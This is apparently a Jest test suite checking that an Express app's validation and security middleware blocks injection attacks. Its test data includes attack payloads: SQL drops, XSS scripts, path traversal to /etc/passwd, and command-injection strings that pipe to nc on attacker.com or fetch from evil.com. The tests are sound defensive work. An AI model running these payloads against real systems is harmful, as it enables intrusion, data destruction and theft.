const request = require('supertest');
const express = require('express');

// Import actual validation utilities, not mocked ones
const {
  sanitizeString,
  sanitizeObject,
  isValidWalletAddress,
  isValidDocumentHash,
  isValidIPFSHash,
  isValidFileType,
  isValidFileSize,
  validationRules,
  validateFile,
  sanitizeRequest,
  ALLOWED_FILE_TYPES,
  FILE_SIZE_LIMITS
} = jest.requireActual('../utils/validation');

const {
  handleValidationErrors,
  preventSQLInjection,
  preventNoSQLInjection,
  preventXSS,
  preventCommandInjection,
  preventPathTraversal,
  validateContentType,
  validateRequestSize,
  securityValidation
} = jest.requireActual('../middleware/validation');

describe('Validation Utils', () => {
  describe('sanitizeString', () => {
    test('should remove HTML tags', () => {
      const input = '<script>alert("xss")</script>Hello World';
      const result = sanitizeString(input);
      expect(result).toBe('Hello World');
    });

    test('should trim whitespace', () => {
      const input = '  Hello World  ';
      const result = sanitizeString(input);
      expect(result).toBe('Hello World');
    });

    test('should handle non-string input', () => {
      expect(sanitizeString(123)).toBe(123);
      expect(sanitizeString(null)).toBe(null);
      expect(sanitizeString(undefined)).toBe(undefined);
    });
  });

  describe('sanitizeObject', () => {
    test('should sanitize nested objects', () => {
      const input = {
        name: '<script>alert("xss")</script>John',
        profile: {
          bio: '<img src="x" onerror="alert(1)">Bio',
          tags: ['<b>tag1</b>', 'tag2']
        }
      };
      
      const result = sanitizeObject(input);
      expect(result.name).toBe('John');
      expect(result.profile.bio).toBe('Bio');
      expect(result.profile.tags).toEqual(['tag1', 'tag2']);
    });
  });

  describe('isValidWalletAddress', () => {
    test('should validate correct wallet addresses', () => {
      expect(isValidWalletAddress('0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b1')).toBe(true);
      expect(isValidWalletAddress('0x0000000000000000000000000000000000000000')).toBe(true);
    });

    test('should reject invalid wallet addresses', () => {
      expect(isValidWalletAddress('0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b')).toBe(false); // too short
      expect(isValidWalletAddress('742d35Cc6634C0532925a3b8D4C9db96C4b4d8b1')).toBe(false); // no 0x prefix
      expect(isValidWalletAddress('0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8bG')).toBe(false); // invalid hex
      expect(isValidWalletAddress('')).toBe(false);
      expect(isValidWalletAddress(null)).toBe(false);
    });
  });

  describe('isValidDocumentHash', () => {
    test('should validate correct document hashes', () => {
      const validHash = '0x' + 'a'.repeat(64);
      expect(isValidDocumentHash(validHash)).toBe(true);
    });

    test('should reject invalid document hashes', () => {
      expect(isValidDocumentHash('0x' + 'a'.repeat(63))).toBe(false); // too short
      expect(isValidDocumentHash('a'.repeat(64))).toBe(false); // no 0x prefix
      expect(isValidDocumentHash('')).toBe(false);
      expect(isValidDocumentHash(null)).toBe(false);
    });
  });

  describe('isValidIPFSHash', () => {
    test('should validate correct IPFS hashes', () => {
      expect(isValidIPFSHash('QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG')).toBe(true);
      expect(isValidIPFSHash('bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi')).toBe(true);
    });

    test('should reject invalid IPFS hashes', () => {
      expect(isValidIPFSHash('invalid-hash')).toBe(false);
      expect(isValidIPFSHash('')).toBe(false);
      expect(isValidIPFSHash(null)).toBe(false);
    });
  });

  describe('isValidFileType', () => {
    test('should validate allowed file types', () => {
      expect(isValidFileType('document.pdf', ALLOWED_FILE_TYPES.documents)).toBe(true);
      expect(isValidFileType('image.jpg', ALLOWED_FILE_TYPES.images)).toBe(true);
      expect(isValidFileType('file.txt', ALLOWED_FILE_TYPES.all)).toBe(true);
    });

    test('should reject disallowed file types', () => {
      expect(isValidFileType('script.exe', ALLOWED_FILE_TYPES.documents)).toBe(false);
      expect(isValidFileType('document.pdf', ALLOWED_FILE_TYPES.images)).toBe(false);
      expect(isValidFileType('', ALLOWED_FILE_TYPES.all)).toBe(false);
    });
  });

  describe('isValidFileSize', () => {
    test('should validate file sizes within limits', () => {
      expect(isValidFileSize(1024, 'document')).toBe(true);
      expect(isValidFileSize(FILE_SIZE_LIMITS.document - 1, 'document')).toBe(true);
    });

    test('should reject oversized files', () => {
      expect(isValidFileSize(FILE_SIZE_LIMITS.document + 1, 'document')).toBe(false);
      expect(isValidFileSize(0, 'document')).toBe(false);
      expect(isValidFileSize(-1, 'document')).toBe(false);
    });
  });
});

describe('Security Middleware', () => {
  let app;

  beforeEach(() => {
    app = express();
    app.use(express.json());
  });

  describe('SQL Injection Prevention', () => {
    test('should block SQL injection attempts', async () => {
      app.post('/test', preventSQLInjection, (req, res) => {
        res.json({ success: true });
      });

      const maliciousPayloads = [
        { query: "'; DROP TABLE users; --" },
        { query: "1' OR '1'='1" },
        { query: "UNION SELECT * FROM users" },
        { query: "'; EXEC xp_cmdshell('dir'); --" }
      ];

      for (const payload of maliciousPayloads) {
        const response = await request(app)
          .post('/test')
          .send(payload);
        
        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.error).toBe('Invalid input detected');
      }
    });

    test('should allow safe queries', async () => {
      app.post('/test', preventSQLInjection, (req, res) => {
        res.json({ success: true });
      });

      const response = await request(app)
        .post('/test')
        .send({ query: 'normal search term' });
      
      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
    });
  });

  describe('NoSQL Injection Prevention', () => {
    test('should block NoSQL injection attempts', async () => {
      app.post('/test', preventNoSQLInjection, (req, res) => {
        res.json({ success: true });
      });

      const maliciousPayloads = [
        { $where: 'this.username == "admin"' },
        { username: { $ne: null } },
        { 'user.name': 'test' }, // dot notation
        { $regex: '/.*/' }
      ];

      for (const payload of maliciousPayloads) {
        const response = await request(app)
          .post('/test')
          .send(payload);
        
        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.error).toBe('Invalid input detected');
      }
    });
  });

  describe('XSS Prevention', () => {
    test('should block XSS attempts', async () => {
      app.post('/test', preventXSS, (req, res) => {
        res.json({ success: true });
      });

      const maliciousPayloads = [
        { content: '<script>alert("xss")</script>' },
        { content: '<img src="x" onerror="alert(1)">' },
        { content: 'javascript:alert("xss")' },
        { content: '<iframe src="javascript:alert(1)"></iframe>' },
        { content: '<div onclick="alert(1)">Click me</div>' }
      ];

      for (const payload of maliciousPayloads) {
        const response = await request(app)
          .post('/test')
          .send(payload);
        
        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.error).toBe('Invalid input detected');
      }
    });
  });

  describe('Command Injection Prevention', () => {
    test('should block command injection attempts', async () => {
      app.post('/test', preventCommandInjection, (req, res) => {
        res.json({ success: true });
      });

      const maliciousPayloads = [
        { command: 'ls -la; rm -rf /' },
        { command: 'test | nc attacker.com 4444' },
        { command: 'file.txt && wget http://evil.com/shell.sh' },
        { command: '$(curl http://evil.com/payload)' },
        { command: 'cmd.exe /c dir' },
        { command: 'powershell -Command "Get-Process"' }
      ];

      for (const payload of maliciousPayloads) {
        const response = await request(app)
          .post('/test')
          .send(payload);
        
        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.error).toBe('Invalid input detected');
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should block path traversal attempts', async () => {
      app.post('/test', preventPathTraversal, (req, res) => {
        res.json({ success: true });
      });

      const maliciousPayloads = [
        { path: '../../../etc/passwd' },
        { path: '..\\..\\windows\\system32\\config\\sam' },
        { path: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' },
        { path: '....//....//....//etc/passwd' }
      ];

      for (const payload of maliciousPayloads) {
        const response = await request(app)
          .post('/test')
          .send(payload);
        
        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.error).toBe('Invalid input detected');
      }
    });
  });

  describe('Content-Type Validation', () => {
    test('should validate allowed content types', async () => {
      app.post('/test', validateContentType(['application/json']), (req, res) => {
        res.json({ success: true });
      });

      const response = await request(app)
        .post('/test')
        .set('Content-Type', 'application/json')
        .send({ test: 'data' });
      
      expect(response.status).toBe(200);
    });

    test('should reject disallowed content types', async () => {
      app.post('/test', validateContentType(['application/json']), (req, res) => {
        res.json({ success: true });
      });

      const response = await request(app)
        .post('/test')
        .set('Content-Type', 'text/plain')
        .send('test data');
      
      expect(response.status).toBe(415);
      expect(response.body.error).toContain('Unsupported Content-Type');
    });
  });

  describe('Request Size Validation', () => {
    test('should accept requests within size limit', async () => {
      app.post('/test', validateRequestSize(1024), (req, res) => {
        res.json({ success: true });
      });

      const response = await request(app)
        .post('/test')
        .send({ data: 'small payload' });
      
      expect(response.status).toBe(200);
    });

    test('should reject oversized requests', async () => {
      // Create a fresh app without express.json() to test size validation properly
      const testApp = express();
      testApp.post('/test', validateRequestSize(10), express.json(), (req, res) => {
        res.json({ success: true });
      });

      const largeData = 'x'.repeat(1000);
      const response = await request(testApp)
        .post('/test')
        .set('Content-Type', 'application/json')
        .send({ data: largeData });
      
      expect(response.status).toBe(413);
      expect(response.body.error).toContain('Request size exceeds limit');
    });
  });

  describe('Comprehensive Security Validation', () => {
    test('should apply all security middlewares', async () => {
      const middlewares = securityValidation({
        enableSQLInjectionPrevention: true,
        enableXSSPrevention: true,
        enableCommandInjectionPrevention: true,
        enableSanitization: false // Disable sanitization for this test
      });

      app.post('/test', ...middlewares, (req, res) => {
        res.json({ success: true });
      });

      // Test SQL injection
      let response = await request(app)
        .post('/test')
        .send({ query: "'; DROP TABLE users; --" });
      
      expect(response.status).toBe(400);

      // Test XSS
      response = await request(app)
        .post('/test')
        .send({ content: '<script>alert("xss")</script>' });
      
      expect(response.status).toBe(400);

      // Test command injection
      response = await request(app)
        .post('/test')
        .send({ command: 'ls -la; rm -rf /' });
      
      expect(response.status).toBe(400);
    });
  });
});

describe('File Validation', () => {
  let app;

  beforeEach(() => {
    app = express();
    app.use(express.json());
  });

  describe('validateFile middleware', () => {
    test('should validate file type and size', () => {
      const mockReq = {
        file: {
          originalname: 'test.pdf',
          size: 1024,
          mimetype: 'application/pdf'
        }
      };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      const middleware = validateFile({
        allowedTypes: ['pdf'],
        maxSize: 2048
      });

      middleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalled();
      expect(mockRes.status).not.toHaveBeenCalled();
    });

    test('should reject invalid file type', () => {
      const mockReq = {
        file: {
          originalname: 'test.exe',
          size: 1024,
          mimetype: 'application/octet-stream'
        }
      };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      const middleware = validateFile({
        allowedTypes: ['pdf'],
        maxSize: 2048
      });

      middleware(mockReq, mockRes, mockNext);
      expect(mockRes.status).toHaveBeenCalledWith(400);
      expect(mockRes.json).toHaveBeenCalledWith({
        success: false,
        error: expect.stringContaining('Invalid file type')
      });
      expect(mockNext).not.toHaveBeenCalled();
    });

    test('should reject oversized file', () => {
      const mockReq = {
        file: {
          originalname: 'test.pdf',
          size: 3000,
          mimetype: 'application/pdf'
        }
      };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      const middleware = validateFile({
        allowedTypes: ['pdf'],
        maxSize: 2048
      });

      middleware(mockReq, mockRes, mockNext);
      expect(mockRes.status).toHaveBeenCalledWith(400);
      expect(mockRes.json).toHaveBeenCalledWith({
        success: false,
        error: expect.stringContaining('File size exceeds limit')
      });
      expect(mockNext).not.toHaveBeenCalled();
    });
  });
});

describe('Validation Bypass Attempts', () => {
  describe('Double encoding bypass attempts', () => {
    test('should prevent double-encoded XSS', () => {
      const input = '%253Cscript%253Ealert%2528%2522xss%2522%2529%253C%252Fscript%253E';
      const decoded = decodeURIComponent(decodeURIComponent(input));
      const sanitized = sanitizeString(decoded);
      expect(sanitized).not.toContain('<script>');
    });
  });

  describe('Unicode bypass attempts', () => {
    test('should handle unicode normalization', () => {
      const input = '\u003cscript\u003ealert("xss")\u003c/script\u003e';
      const sanitized = sanitizeString(input);
      expect(sanitized).not.toContain('<script>');
    });
  });

  describe('Case variation bypass attempts', () => {
    test('should handle case variations in SQL injection', () => {
      const inputs = [
        "'; DRoP TaBlE users; --",
        "'; drop table USERS; --",
        "'; Drop Table Users; --"
      ];

      inputs.forEach(input => {
        const app = express();
        app.use(express.json());
        app.post('/test', preventSQLInjection, (req, res) => {
          res.json({ success: true });
        });

        return request(app)
          .post('/test')
          .send({ query: input })
          .expect(400);
      });
    });
  });
});